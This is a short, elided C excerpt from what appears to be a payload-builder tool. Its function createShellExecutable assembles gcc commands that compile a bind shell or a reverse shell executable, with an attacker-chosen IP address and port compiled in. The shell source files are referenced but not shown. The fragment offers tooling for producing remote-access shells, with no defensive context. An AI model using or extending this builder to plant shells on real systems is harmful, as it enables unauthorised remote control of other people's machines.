...
void createShellExecutable(struct Shell shell) {
    ...
    if (shell.type == 0){
        ...
        sprintf(cmd, "gcc -D PORT=%d -D IP=%s -o bshell.exe shells/bindshell.c", shell.port, shell.ip);
    }
    else if (shell.type == 1){
        printf("Creating reverse shell executable...\n");
        sprintf(cmd, "gcc -D PORT=%d -D IP=%s -o rshell.exe shells/reverseshell.c", shell.port, shell.ip);
    }
    else{
        printf("Invalid type.\n");
    }
